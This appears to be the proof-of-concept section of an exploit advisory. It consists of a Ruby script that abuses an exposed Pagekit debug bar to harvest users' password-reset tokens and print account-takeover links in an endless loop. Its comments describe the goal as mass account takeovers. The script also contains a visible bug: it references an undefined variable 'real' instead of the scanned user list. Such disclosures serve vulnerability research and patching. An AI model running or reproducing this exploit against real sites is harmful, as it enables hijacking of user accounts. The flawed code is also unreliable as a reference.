2. Proof of Concept

require 'net/http'

#Enter the domain/IP address of the site for which you want to test this vulnerability
vulnerableSite = 'http://127.0.0.1'

loopCount = 0
while loopCount == 0


#We request the Login page which has the debug parameter
url = URI.parse(vulnerableSite + '/pagekit/index.php/user/login')
request = Net::HTTP::Get.new(url.to_s)
resp = Net::HTTP.start(url.host, url.port) {|http|
http.request(request)
}

#The response is received and is sent to many regular expression to find the value of _debug parameter from its HTML source code
bodyOfResponse =  resp.body
myArray1 = bodyOfResponse.split(/"current":"/)
outputOfMyArray1 = myArray1[1]
myArray2 = outputOfMyArray1.split(/"};/)
theSecret = myArray2[0]
puts ""
puts "The secret token to debug link is: #{theSecret}"
puts ""
url = URI.parse(vulnerableSite + '/pagekit/index.php/_debugbar/' + theSecret)
request = Net::HTTP::Get.new(url.to_s)
resp = Net::HTTP.start(url.host, url.port) {|http|
http.request(request)
}

resp.body

initial = resp.body

#The count of number of victim users is found out
 users = initial.scan(/user=.+?(?=")/)
 c =  users.count
 e = c.to_i

#If the count is 0 then we continuosly monitor it
 if c == 0 then puts "Currently no user has clicked on reset password like."

 puts ""
 puts "Trying again..."
 puts ""
 puts ""

#If the count is greater than 0 then it means we found a victim. So, find the password reset link and display it in the console
 else

 link1 = vulnerableSite + "/pagekit/index.php/user/resetpassword/confirm?user="
 link2 = "&key="
 i = 0
  while i<e
	securityToken = ''
    a = real[i]
	b = a.split('=')
	c = b[1]
	d = c.split('\\')
	victimUserName = d[0]
	puts "The victim is: #{victimUserName}"
	f = b[2]
	securityToken = f.scan(/[^\\]/)
	securityTokenFiltered = securityToken.join
	puts "The security token of victim is: #{securityTokenFiltered}"
	puts "Link for account takeover"
	puts "#{link1}#{victimUserName}#{link2}#{securityTokenFiltered}"
	puts ""
	puts ""
	i += 1
 end


 end

 # This loop runs forever because we want to continuosly monitor who is requesting a password reset and who has clicked on the link so that
 # we can perform mass account takeovers
 end
